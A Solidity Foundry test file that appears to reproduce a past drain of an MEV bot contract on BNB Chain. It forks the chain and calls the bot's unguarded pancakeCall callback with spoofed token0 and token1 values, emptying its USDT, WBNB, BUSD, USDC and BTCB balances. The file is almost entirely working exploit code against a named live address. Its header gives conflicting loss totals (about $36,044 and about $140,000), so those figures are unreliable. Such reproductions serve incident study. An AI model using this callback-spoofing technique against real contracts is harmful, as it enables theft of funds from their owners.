// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/StdCheats.sol";
import '@openzeppelin/contracts//token/ERC20/IERC20.sol';


// @KeyInfo - Total Lost : ~36,044 US$
// Attack Tx: https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2
// Attacker Address(EOA): 0xee286554f8b315f0560a15b6f085ddad616d0601
// Attack Contract Address: 0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1
// Vulnerable Address: 0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d (mev)
// Total Loss: ~ $140 000

interface IMEVBot {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

//  分析攻击需要的变量
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
IMEVBot constant mevBot = IMEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);

event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);


contract MEVBotPoC is Test { // 模拟攻击
    address internal _token0;
    address internal _token1;
    function setUp() public {
        vm.createSelectFork("bsc", 21_297_409);
    }

    function testAttack() public {
        console.log("-------------------------------- Start MEVBot(BNB484) Exploit ----------------------------------");
        console.log("Tx:0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2");
        console.log("Attacker Balance information: ");

        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD balance before exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 18);

        // 记录攻击前 bot 的balance,这也是我们攻击的目标金额
        uint256 USDTAmount = USDT.balanceOf(address(mevBot));
        uint256 WBNBAmount = WBNB.balanceOf(address(mevBot));
        uint256 BUSDAmount = BUSD.balanceOf(address(mevBot));
        uint256 USDCAmount = USDC.balanceOf(address(mevBot));
        uint256 BTCBAmount = BTCB.balanceOf(address(mevBot));

        // 调用5次 BSC-USD、WBNB、BUSD、USDC、BTCB
        (_token0, _token1) = (address(USDT), address(USDT));
        mevBot.pancakeCall(address(this), USDTAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));

        (_token0, _token1) = (address(WBNB), address(WBNB));
        mevBot.pancakeCall(address(this), WBNBAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));

        (_token0, _token1) = (address(BUSD), address(BUSD));
        mevBot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));

        (_token0, _token1) = (address(USDC), address(USDC));
        mevBot.pancakeCall(address(this), USDCAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
        
        (_token0, _token1) = (address(BTCB), address(BTCB));
        mevBot.pancakeCall(address(this), BTCBAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 18);
    }

    function token0() public view returns (address) {
        return _token0;
    }

    function token1() public view returns (address) {
        return _token1;
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) public {}
}